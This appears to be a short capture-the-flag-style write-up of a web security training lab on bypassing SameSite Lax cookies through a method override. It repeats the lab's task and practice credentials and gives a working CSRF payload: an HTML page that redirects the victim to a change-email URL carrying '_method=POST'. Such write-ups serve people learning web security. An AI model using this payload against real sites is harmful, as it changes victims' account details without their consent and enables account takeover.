# Lab: SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

![image.png](Lab%20SameSite%20Lax%20bypass%20via%20method%20override/image.png)

![image.png](Lab%20SameSite%20Lax%20bypass%20via%20method%20override/image%201.png)

![image.png](Lab%20SameSite%20Lax%20bypass%20via%20method%20override/image%202.png)

![image.png](Lab%20SameSite%20Lax%20bypass%20via%20method%20override/image%203.png)

```html
<html>
  <body>
    <script>
      document.location = "https://0a3300c7044178038029300600a000cb.web-security-academy.net/my-account/change-email?email=doo@web-security-academy.net&_method=POST"
    </script>
  </body>
</html>
```